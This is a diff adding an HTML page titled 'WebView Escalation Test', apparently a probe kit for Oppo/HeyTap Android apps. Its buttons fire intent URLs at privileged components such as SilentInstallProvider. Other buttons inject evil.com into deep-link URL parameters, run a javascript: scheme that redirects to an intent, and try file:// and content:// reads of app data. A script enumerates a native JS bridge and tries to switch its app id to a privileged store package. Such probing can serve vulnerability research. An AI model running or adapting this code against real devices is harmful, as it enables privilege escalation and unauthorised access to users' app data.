@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebView Escalation Test</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            padding: 20px;
+            background: #1a1a2e;
+            color: #fff;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+        }
+
+        button {
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 5px;
+            display: block;
+            width: 100%;
+            text-align: left;
+        }
+
+        button:active {
+            opacity: 0.8;
+        }
+
+        pre {
+            background: #0f0f23;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 0.75em;
+            word-break: break-all;
+        }
+
+        .section {
+            margin: 15px 0;
+        }
+
+        h3 {
+            color: #e94560;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>🔓 WebView Escalation Test</h1>
+    <p>Try to open more privileged WebViews or activities from this context</p>
+
+    <div class="card">
+        <h3>1. Intent URLs (Activity Launch)</h3>
+        <div class="section">
+            <button
+                onclick="tryIntent('intent://settings/#Intent;scheme=android-app;package=com.android.settings;end')">
+                📱 Open Android Settings
+            </button>
+            <button onclick="tryIntent('intent://#Intent;component=com.oplus.games/.MainActivity;end')">
+                🎮 Open Games MainActivity
+            </button>
+            <button
+                onclick="tryIntent('intent://#Intent;component=com.oplus.games/.provider.SilentInstallProvider;end')">
+                ⚠️ Try SilentInstallProvider
+            </button>
+            <button
+                onclick="tryIntent('intent://cloud.heytap.com/route#Intent;scheme=htcloud;package=com.heytap.cloud;end')">
+                ☁️ Open HeytapCloud WebView
+            </button>
+            <button onclick="tryIntent('intent://theme/web#Intent;scheme=oaps;package=com.oplus.themestore;end')">
+                🎨 Open ThemeStore WebView
+            </button>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>2. Deep Links (Other Apps)</h3>
+        <div class="section">
+            <button onclick="tryLink('htcloud://cloud.heytap.com/route?url=https://evil.com')">
+                ☁️ htcloud:// with URL param
+            </button>
+            <button onclick="tryLink('heytapbrowser://webpage/view?url=https://evil.com')">
+                🌐 heytapbrowser:// Open URL
+            </button>
+            <button onclick="tryLink('healthcheck://remotediagnosis.verify')">
+                🏥 healthcheck:// HtmlActivity
+            </button>
+            <button onclick="tryLink('fat://fb/main')">
+                📝 fat://fb/main FeedbackActivity
+            </button>
+            <button onclick="tryLink('account://login')">
+                👤 account:// Login
+            </button>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>3. JavaScript Scheme</h3>
+        <div class="section">
+            <button onclick="tryLink('javascript:alert(document.domain)')">
+                ⚡ javascript: alert
+            </button>
+            <button
+                onclick="tryLink('javascript:window.location=\\'intent://settings/#Intent;scheme=android-app;end\\'')">
+                ⚡ javascript: → intent
+            </button>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>4. File Access</h3>
+        <div class="section">
+            <button onclick="tryLink('file:///sdcard/Download/')">
+                📁 file:// sdcard
+            </button>
+            <button onclick="tryLink('file:///data/data/com.oplus.games/')">
+                📁 file:// app data (likely blocked)
+            </button>
+            <button onclick="tryLink('content://com.oplus.games.provider/files')">
+                📁 content:// provider
+            </button>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>5. HyperJsbridge Escalation</h3>
+        <div class="section">
+            <button onclick="tryBridgeEscalation()">
+                🔧 Try all HyperJsbridge methods
+            </button>
+        </div>
+        <pre id="bridge-result">Click to test</pre>
+    </div>
+
+    <div class="card">
+        <h3>Log</h3>
+        <pre id="log"></pre>
+    </div>
+
+    <script>
+        const log = (msg) => {
+            const el = document.getElementById('log');
+            el.textContent = `[${new Date().toLocaleTimeString()}] ${msg}\n` + el.textContent;
+        };
+
+        const tryIntent = (intentUrl) => {
+            log(`Trying intent: ${intentUrl}`);
+            try {
+                window.location.href = intentUrl;
+            } catch (e) {
+                log(`Error: ${e.message}`);
+            }
+        };
+
+        const tryLink = (url) => {
+            log(`Trying link: ${url}`);
+            try {
+                // Method 1: Direct navigation
+                window.location.href = url;
+            } catch (e) {
+                log(`Error: ${e.message}`);
+                // Method 2: Create link and click
+                try {
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.click();
+                } catch (e2) {
+                    log(`Link click also failed: ${e2.message}`);
+                }
+            }
+        };
+
+        const tryBridgeEscalation = () => {
+            const el = document.getElementById('bridge-result');
+            el.textContent = 'Testing HyperJsbridge methods...\n';
+
+            if (typeof HyperJsbridge === 'undefined') {
+                el.textContent += 'HyperJsbridge not available\n';
+                return;
+            }
+
+            // Try to enumerate and call all methods
+            for (let key in HyperJsbridge) {
+                el.textContent += `Method: ${key}\n`;
+                try {
+                    if (typeof HyperJsbridge[key] === 'function') {
+                        // Try calling with various inputs
+                        el.textContent += `  Trying ${key}()...\n`;
+
+                        // Test with different payloads
+                        if (key === 'changeHyperAppid') {
+                            // Try to change to a privileged appid
+                            try {
+                                HyperJsbridge.changeHyperAppid('com.heytap.market');
+                                el.textContent += `  changeHyperAppid('com.heytap.market') - OK\n`;
+                            } catch (e) {
+                                el.textContent += `  Error: ${e.message}\n`;
+                            }
+                        }
+
+                        if (key === 'playNow') {
+                            el.textContent += `  playNow available - can trigger game launch\n`;
+                        }
+                    }
+                } catch (e) {
+                    el.textContent += `  Error on ${key}: ${e.message}\n`;
+                }
+            }
+
+            // Try to find hidden methods
+            el.textContent += '\nSearching for hidden properties...\n';
+            try {
+                const props = Object.getOwnPropertyNames(HyperJsbridge);
+                el.textContent += `Properties: ${props.join(', ')}\n`;
+            } catch (e) {
+                el.textContent += `Error: ${e.message}\n`;
+            }
+        };
+
+        log('Escalation test page loaded');
+        log(`Current URL: ${window.location.href}`);
+    </script>
+</body>
+
+</html>
